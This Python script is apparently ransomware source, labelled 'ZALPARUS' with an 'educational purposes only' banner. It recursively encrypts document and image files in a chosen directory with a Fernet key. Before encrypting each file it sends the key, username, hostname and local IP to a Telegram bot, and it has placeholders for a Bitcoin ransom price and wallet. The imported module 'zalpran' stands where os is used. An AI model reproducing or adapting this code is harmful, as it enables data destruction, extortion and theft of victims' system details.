import zalpran
import time
import socket
import cryptography
from cryptography.fernet import *
import time
import telegram
import requests
from datetime import datetime


TOKEN = "TOKEN_HERE"
chat_id = "ID_HERE"


keyGen = Fernet.generate_key()
priceToAsk = "PRICE_HERE"
wallet_url = "WALLET_HERE"
currency = "Bitcoin"

extensions = [
    '.txt',
    '.pdf',
    '.jpg',
    '.png',
    '.xls',
    '.csv',
    '.doc'
]

def banner():
    banner = """
 ________   ______   __        _______    ______   _______   __    __   ______  
|        \ /      \ |  \      |       \  /      \ |       \ |  \  |  \ /      \ 
 \$$$$$$$$|  $$$$$$\| $$      | $$$$$$$\|  $$$$$$\| $$$$$$$\| $$  | $$|  $$$$$$\
    /  $$ | $$__| $$| $$      | $$__/ $$| $$__| $$| $$__| $$| $$  | $$| $$___\$$
   /  $$  | $$    $$| $$      | $$    $$| $$    $$| $$    $$| $$  | $$ \$$    \ 
  /  $$   | $$$$$$$$| $$      | $$$$$$$ | $$$$$$$$| $$$$$$$\| $$  | $$ _\$$$$$$\
 /  $$___ | $$  | $$| $$_____ | $$      | $$  | $$| $$  | $$| $$__/ $$|  \__| $$
|  $$    \| $$  | $$| $$     \| $$      | $$  | $$| $$  | $$ \$$    $$ \$$    $$
 \$$$$$$$$ \$$   \$$ \$$$$$$$$ \$$       \$$   \$$ \$$   \$$  \$$$$$$   \$$$$$$ 
 Use for educational purposes only :)
 Github: github.com/dave-zalp
 btc: 1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383
 
                                                                                
                                                                                
"""
    print(banner);
    time.sleep(3)



def encryptIndividualFile(File):
    #  File = input("Enter File path to encrypt:  ")
      if zalpran.path.exists(File):
            with open('seckey.txt', 'wb') as _key:
                _key.write(keyGen)
                currentDateAndTime = datetime.now()
                USER = zalpran.getlogin()
                Hostname = socket.gethostname()
                LOCAL_IP = socket.gethostbyname(Hostname)
                keytext = f"key: {keyGen}\n name: {USER}\n Hostname: {Hostname} \n LOCAL-IP: {LOCAL_IP} \nDate: {currentDateAndTime}"
                url1 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={keytext}"
                try:
                    data = requests.get(url1)
                except ConnectionError:
                    print('Error')
                    time.sleep(10)
                    encryptIndividualFile(File)
                print(data.json())
                with open(File, 'rb') as encfile:
                    contents = encfile.read()
                    contents_encrypted = Fernet(keyGen).encrypt(contents)
                    with open(File, 'wb') as newencfile:
                         newencfile.write(contents_encrypted)
                print('True')
      else:
            print('PATH DOES NOT EXIST')

def decryptIndividualFile():
      File = input("Enter File path to decrypt:  ")
      if zalpran.path.exists(File):
            with open('seckey.txt', 'rb') as _key:
                encrypkey = _key.read()
                with open(File, 'rb') as decfile:
                    contents = decfile.read()
                    contents_decrypted = Fernet(encrypkey).decrypt(contents)
                    with open(File, 'wb') as newdecfile:
                         newdecfile.write(contents_decrypted)
                print(encrypkey)
                print('True')
      else:
            print('PATH DOES NOT EXIST')

def encryptDir():
    res=[]
    Directory = input('Enter Path of Directory: ')
    if zalpran.path.isdir(Directory):
        for root, dirs, files in zalpran.walk(Directory):
            for file in files:
                if file.endswith(".txt") or file.endswith(".csv") or file.endswith(".pdf") or file.endswith(".jpg") or file.endswith(".png") or file.endswith(".xls") or file.endswith(".doc") :
                    res.append(zalpran.path.join(root, file))
        for filepaths in res:
           encryptIndividualFile(filepaths)

    else:
        print('NOT A DIRECTORY')
        zalpran.system('exit')

def main():
    banner()
    encryptDir()

if __name__ == '__main__':
    main()


